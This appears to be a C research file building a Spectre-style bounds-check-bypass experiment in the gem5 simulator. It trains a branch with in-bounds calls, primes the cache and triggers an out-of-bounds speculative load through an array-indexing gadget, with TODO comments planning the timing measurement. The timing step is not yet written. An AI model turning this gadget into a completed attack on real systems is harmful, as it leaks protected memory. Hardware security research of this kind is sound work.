#include<stdio.h>
#include<stdlib.h>
#include"/home/tarun-d/Desktop/gem5/include/gem5/m5ops.h"

int x,y,z;
int array1[100];
char array2[100]; 
int array3[8192];
// int array4[1048576];   

int a1_len = 100;

// TODO: full-fledged attack.

// TODO: a1_len must not be #define, rather we'll have to define that value 
//*      in a variable so that it gets fetched every time. 
//*      This can be done by creating a conflict every time that value is being fetched from the set-associative cache.
//*      This will increase the transient execution time such that we can execute the speculated instructions for a longer amount of time.

void func(int N){                       
    if(N < a1_len){           
        y = array2[16 * array1[N]];                      //// ====> array1[105] = array3[1] = 0  at  0x6bc5e4   //  array2[0] = 0x6bc3c0
    }
}

void fill_cache(){

    for(int k=0;k<8192;k=k+16){            // TODO: This has to be changed
    
        z = array3[k];
    
    }

    // TODO : Access A1, A2
    
    
}

int main(){
    int i,j;
    printf("\nAddress of a1_len = %p \n" , &a1_len);
    printf("\nAddress of i = %p \n" , &i);
    printf("\nAddress of j = %p \n" , &j);
    printf("\nAddress of x = %p \n" , &x);
    printf("\nAddress of y = %p \n" , &y);
    printf("\nAddress of array1 = %p \n" , array1);
    printf("\nAddress of array2 = %p \n" , array2);
    printf("\nAddress of array3 = %p \n" , array3);

    array3[1] = 1;              // TODO: array1[105] = 1; So we should get more access time for A1;

    m5_global_init();           //* Stats are from here.

    //*-------------- Initializing array1 ----------------------
    for(i=0;i<100;i++){
        array1[i] = 5;          //* All the 100 accesses for array2[] will be of array2[16*5] == array2[80]
    }
    

    for(j=0;j<100;j++){                 //* Training        
        
        //fill_cache();                // TODO: How does the replacement policy play a role?
        func(j);

    }

    fill_cache();

    func(105);                          //* Trigger

    // TODO: Access A1 and A2 and compare the timings.


    for(i=0;i<10;i++){                  //* To increase the number of instructions for m5_global_int() to get all the required traces.
    }
    
    m5_global_init();
}